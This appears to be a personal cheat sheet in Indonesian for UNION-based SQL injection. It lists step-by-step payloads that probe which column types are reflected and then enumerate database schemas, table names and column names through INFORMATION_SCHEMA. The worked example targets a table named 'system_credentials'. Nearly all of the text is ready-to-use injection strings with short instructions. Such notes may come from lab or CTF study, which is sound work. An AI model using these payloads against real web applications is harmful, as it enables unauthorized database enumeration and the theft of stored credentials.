note:

CARI TAU JENIS OUTPUT YANG RELEVAN:
1 UNION SELECT 1, 'abc', NULL, NULL, NULL
note:
ubah column satu persatu dan perhatikan apakah error, jika integer error berarti column menerima strings dan sebaliknya

CARI TAU NAMA DATABASES:
1 UNION SELECT NULL, SCHEMA_NAME, NULL, NULL, NULL
FROM INFORMATION_SCHEMA.SCHEMATA


CARI TAU NAMA TABLE:
1 UNION SELECT NULL, TABLE_NAME, NULL, NULL, NULL FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='public'


CARI TAU NAMA COLOMN:
1 UNION SELECT NULL, COLUMN_NAME, NULL, NULL, NULL 
FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='SESUIKAN DENGAN NMA TABLE'

EXAMPLE:
1 UNION SELECT NULL, COLUMN_NAME, NULL, NULL, NULL FROM INFORMATION_SCHEMA.COLUMNS 
WHERE TABLE_NAME='system_credentials'
